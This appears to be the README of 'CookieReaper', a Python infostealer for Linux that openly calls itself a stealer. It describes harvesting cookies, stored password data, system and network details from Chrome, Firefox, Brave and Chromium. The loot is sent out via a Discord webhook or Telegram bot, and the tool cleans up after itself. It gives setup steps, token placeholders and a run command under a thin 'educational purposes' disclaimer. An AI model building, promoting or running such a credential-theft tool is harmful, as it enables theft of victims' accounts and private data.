# 🍪 CookieReaper

CookieReaper is a powerful browser data analysis tool aka "stealer" designed for Linux systems. It extracts and analyzes browser data from multiple browsers including Chrome, Firefox, Brave, and Chromium.

## 🔥 Features

- Multi-browser support (Chrome, Firefox, Brave, Chromium)
- Cookie extraction and analysis
- Password data collection
- Automatic data organization
- Secure data transmission via Discord if failed, Telegram as fallback
- System information gathering
- Automatic cleanup after execution

## 🛠️ Requirements

```bash
pip install -r requirements.txt
```

Required Python packages:
- browser-cookie3
- pycryptodome
- requests
- python-secretstorage

## 💻 Supported Browsers

- Google Chrome
- Mozilla Firefox
- Brave Browser
- Chromium

## 🚀 Usage

1. Configure your tokens in the script:
```python
DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
```

2. Run the script:
```bash
python3 cookiereaper.py
```

## 📁 Output Structure

```
browser_data_[timestamp]_[session_id]/
├── cookies/
│   ├── chrome/
│   ├── firefox/
│   ├── brave/
│   └── chromium/
└── passwords/
    ├── chrome/
    ├── firefox/
    ├── brave/
    └── chromium/
```

## ⚡ Features in Detail

- **Automatic Browser Detection**: Automatically detects installed browsers
- **Cookie Collection**: Extracts and organizes cookies by domain
- **Password Data**: Collects encrypted password data
- **System Info**: Gathers detailed system information
- **Network Details**: Collects IP and network information
- **Secure Transfer**: Supports both Discord and Telegram for data transfer
- **Auto Cleanup**: Removes temporary files after successful transfer

## 🔒 Security

- All data is handled securely in memory
- Temporary files are securely deleted after processing
- Secure data transfer via Discord/Telegram APIs

## ⚠️ Disclaimer

This tool is for educational purposes only. Always ensure you have proper authorization before collecting browser data. Unauthorized access to browser data may be illegal in your jurisdiction.

## 🤝 Contributing

Feel free to submit issues and enhancement requests. 